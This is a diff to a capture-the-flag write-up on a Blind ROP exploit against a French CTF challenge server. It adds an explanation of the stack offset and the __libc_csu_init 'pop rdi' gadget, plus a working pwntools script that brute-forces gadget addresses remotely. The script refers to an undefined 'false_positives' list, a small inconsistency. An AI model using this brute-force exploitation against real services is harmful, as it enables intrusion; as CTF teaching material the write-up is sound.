@@ -109,7 +109,9 @@ for i in offsets:
 
 ![leak](images/leak.png)
 
-Those are definitly **x86-64** addresses. Consequently, because the stack buffer overflow happens after 40 bytes, we can deduce that the buffer is 32 bytes big. Indeed we fill the buffer with 32 `A`, then we overwrite `rbp` which is 8 bytes long in **x86-64** and then we can control the execution flow overwriting the `rip` register. We can also see that constant `0x4006cc` address at offset 40 which must be the return address in `rip` that we will overwrite.
+Those are definitly **x86-64** addresses. Consequently, because the stack buffer overflow happens after 40 bytes, we can deduce that the buffer is 32 bytes big. Indeed we fill the buffer with 32 `A`, then we overwrite `rbp` which is 8 bytes long in **x86-64** and then we can control the execution flow overwriting the `rip` register. We can also see that constant `0x4006cc` address at offset 40 which must be the return address in `rip` that we will overwrite. The fact that this address is constant also proves the [PIE](https://en.wikipedia.org/wiki/Position-independent_code) protection is not enabled.
+
+*Note: we do not exactly overwrite `rip`. We overwrite the return address which is popped into `rip` at the of the function, but it is easier to just say we overwrite `rip`.*
 
 Nice, we have the entry point! Now what? We can control where to go, but the question is: where do we want to go?
 
@@ -185,7 +187,7 @@ ref = b'Hello you.\nWhat is your name ?\n>>> '
 base_addr = 0x400000
 L = [] # where we stock out false positives
 
-# custom range to save some time but we first scanned from 0x400000 to 0x410000
+# custom range to save some time but we first scanned from 0x400000 to 0x401000
 start = 0x500
 end = start + 0x300
 
@@ -202,7 +204,7 @@ for i in range(start, end):
         pld = b'c' * 40 # fill buffer
         pld += p64(addr) # overwrite `rip`
 
-        # send and get output
+        # send payload and get output
         r.recv(timeout=0.1)
         r.send(pld)
         res = r.recv(timeout=0.1)
@@ -228,6 +230,100 @@ log.success(f'stop_gadgets = {[hex(i) for i in stop_gadgets]}')
 
 Success! We now have a way to know exactly when we successfully control `rip`. So, what's next?
 
-# The BROP gadget
+### The BROP gadget
+
+Our goal is to get a shell on the server. To do so, we need a way to leak a libc address because the ASLR is on as we saw when leaking addresses. Once we have a leak, we can find the libc version and get the offsets for both the `/bin/sh` string AND the `system` function, but I will explain this later. Right now the only thing we should worry about is: how to control registers? In facts we only want to control `rdi` as this register is the first argument in the calling convention. However we still have no clue about what gadgets we can find in the binary... Do we?
+
+Lucky us, there is a very special gadget that almost all binaries have in common. It is located at the end of `__libc_csu_init` and, as we will see, it is VERY useful...
+
+```asm
+[...]
+40126a:       5b                      pop    rbx
+40126b:       5d                      pop    rbp
+40126c:       41 5c                   pop    r12
+40126e:       41 5d                   pop    r13
+401270:       41 5e                   pop    r14
+401272:       41 5f                   pop    r15
+401274:       c3                      ret
+```
+
+*Note: those are fake addresses to illustrate the gadget, those have nothing to do with our challenge.*
+
+Great isn't it? This gadget is very easy to spot as it pops 6 values from the stack. But where is our `pop rdi; ret`? Have a better look... What happens if we jump on the address `0x401273`? The executed opcodes will be
+
+```
+401273:     5f      pop    rdi
+401274:     c3      ret
+```
+
+A gadget inside a gadget, binary exploitation is awesome.
+
+<p align="center">
+    <img src="images/brop.png" height="300">
+</p>
+
+Cool, let's find this magic gadget. To do so, we overwite `rip` with the address we are incrementing, followed with 6 trash addresses that should be popped into `rbx`, `rbp`, `r12`, `r13`, `r14` and `r15` if the address is the right one. Then we add our stop gadget that will be loaded into `rip` on the `ret` instruction, leading the output to be our reference string!
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+from Crypto.Util.number import bytes_to_long
+import os
+
+ref = b'Hello you.\nWhat is your name ?\n>>> '
+base_addr = 0x400000 # start of the ELF
+
+# values we found earlier
+stop_gadgets = [0x400560, 0x400562, 0x400563, 0x400565, 0x400566, 0x400567,
+        0x400569, 0x40056d, 0x40056e, 0x40056f, 0x400570, 0x400576, 0x400577,
+        0x4006b4, 0x4006b5, 0x4006b6, 0x4006b8, 0x40073b]
+stop_gadget = 0x400560
+
+start = 0
+end = start + 0x1000
+L = [] # we also check if there are any false positives
+
+for i in range(start, end):
+    # connect to server
+    context.log_level='error'
+    r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
+    context.log_level='info'
+
+    try:
+        # build payload
+        addr = base_addr + i
+        log.info(f'trying addr = {hex(addr)}')
+        pld = b'c' * 40         # fill buffer
+        pld += p64(addr)        # brop gadget
+        pld += p64(0) * 6       # 6 addresses we load in registers
+        pld += p64(stop_gadget) # rip
+
+        # send payload and check if output is the reference
+        r.recv(timeout=0.1)
+        r.send(pld)
+        res = r.recv(timeout=0.1)
+        if ref in res:
+            # /!\ be careful with false positives /!\
+            if addr not in false_positives:
+                L.append(addr)
+
+    # nothing at this address, close the connection and iterate
+    except:
+        pass
+    context.log_level='error'
+    r.close()
+    context.log_level='info'
+
+log.success(f'brop_gadgets = {[hex(i) for i in L]}')
+```
+
+As you see we also avoid the address we're searching for to be one of the false positives we found earlier. Indeed, because this address is our `rip` value, if we jump on a location that directly prints out our reference, we will have no idea that we never popped anything and that we just fell in a stupid rabbit hole.
+
+![bropex](images/bropex.png)
+
+Again we prefer to be sure we don't stop on the first one we find. One of them must be a false positive for a reason we do not know, but having only 2 candidates is not a problem as we will get rid of the one that does not work on the next step: finding a way to print out everything we want.
+
+### Finding puts PLT
 
 
